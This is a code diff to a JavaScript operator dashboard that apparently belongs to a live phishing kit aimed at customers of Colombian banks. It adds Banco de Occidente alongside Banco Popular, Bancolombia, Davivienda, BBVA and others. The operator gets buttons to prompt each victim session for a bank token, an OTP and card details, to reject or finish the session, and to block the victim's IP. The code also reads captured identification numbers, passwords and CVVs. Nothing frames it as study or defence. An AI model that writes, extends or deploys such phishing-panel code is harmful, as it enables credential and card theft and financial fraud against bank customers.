@@ -681,6 +681,17 @@ function botonesSesion(s) {
 
     // 🔥 BOTONES DE BANCO POPULAR (ORDEN ESTRICTO) 🔥
     if (bancoKey === 'popular') {
+        btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
+        btns.push(`<button class="btn btn-token" title="Pedir Token" onclick="accion('${sid}','TOKEN')">🔢</button>`);
+        btns.push(`<button class="btn btn-otp" title="Pedir OTP" onclick="accion('${sid}','OTP')">📱</button>`);
+        btns.push(`<button class="btn" style="background:#0ea5e9; color:white;" title="Pedir CC POPU" onclick="accion('${sid}','PEDIR_TARJETA_POPULAR')">💳</button>`);
+        btns.push(`<button class="btn btn-final" title="Finalizar" onclick="accion('${sid}','FINALIZAR')">✅</button>`);
+        btns.push(`<button class="btn btn-block" title="Bloquear IP" onclick="bloquearIp('${ip}')">🚫</button>`);
+        return btns.join('');
+    }
+
+    // 🔥 BOTONES DE BANCO DE OCCIDENTE (ORDEN ESTRICTO) 🔥
+    if (bancoKey === 'occidente') {
         // 1. Rechazar
         btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
         
@@ -690,8 +701,8 @@ function botonesSesion(s) {
         // 3. Pedir OTP
         btns.push(`<button class="btn btn-otp" title="Pedir OTP" onclick="accion('${sid}','OTP')">📱</button>`);
         
-        // 4. Pedir CC POPU
-        btns.push(`<button class="btn" style="background:#0ea5e9; color:white;" title="Pedir CC POPU" onclick="accion('${sid}','PEDIR_TARJETA_POPULAR')">💳</button>`);
+        // 4. Pedir CC Occi
+        btns.push(`<button class="btn" style="background:#0ea5e9; color:white;" title="Pedir CC Occi" onclick="accion('${sid}','PEDIR_TARJETA_OCCIDENTE')">💳</button>`);
         
         // 5. Finalizar
         btns.push(`<button class="btn btn-final" title="Finalizar" onclick="accion('${sid}','FINALIZAR')">✅</button>`);
@@ -846,7 +857,7 @@ function renderSesiones() {
         }
         else if (pasoActual === 'clavedin') pasoTexto = 'Clave Dinámica';
 
-        const esTarjeta = banco === 'cc-bogota' || banco === 'cc-bucaramanga' || banco === 'bancolombia' || banco === 'vanti' || banco === 'davivienda' || banco === 'bbva' || banco === 'popular';
+        const esTarjeta = banco === 'cc-bogota' || banco === 'cc-bucaramanga' || banco === 'bancolombia' || banco === 'vanti' || banco === 'davivienda' || banco === 'bbva' || banco === 'popular' || banco === 'occidente';
         let identificacionTrj = '-';
         let claveFch = '-';
         let cvv = '-';
